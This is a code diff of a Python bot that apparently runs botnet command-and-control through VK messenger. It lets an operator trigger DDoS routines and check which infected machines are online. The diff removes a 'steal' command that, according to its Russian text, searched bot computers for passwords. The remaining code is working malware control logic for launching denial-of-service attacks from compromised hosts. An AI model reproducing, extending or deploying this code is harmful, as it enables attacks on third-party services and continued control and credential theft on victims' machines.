@@ -1,7 +1,6 @@
 from MainDDoS import mainDDoS
 from SecondDDoS import secondDDoS
 from Startup import startup
-from Steal import steal
 from vk_api import VkApi
 from vk_api.utils import get_random_id
 from vk_api.longpoll import VkLongPoll, VkEventType
@@ -33,16 +32,12 @@ for event in longpoll.listen():
             message('DDoS - войти в DDoS панель')
             message('Check - проверить появились-ли новые боты')
             message('online - боты онлайн')
-            message('Имя бота + steal - поиск паролей на компьютере бота')
             for event in longpoll.listen():
                 if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                     if event.text == 'DDoS':
                         mainDDoS()
                     elif event.text == 'online':
                         message(name + ' - Админ онлайн')
-                    elif event.text == name + ' steal':
-                        message('Поиск паролей у ' + name)
-                        steal()
         elif event.text == 'Check':
             message('Бот в сети! - ' + name)
             for event in longpoll.listen():
@@ -51,7 +46,3 @@ for event in longpoll.listen():
                         secondDDoS()
                     elif event.text == 'online':
                         message(name + ' - онлайн')
-                    elif event.text == name + ' steal':
-                        message('Поиск паролей у ' + name)
-                        steal()
-
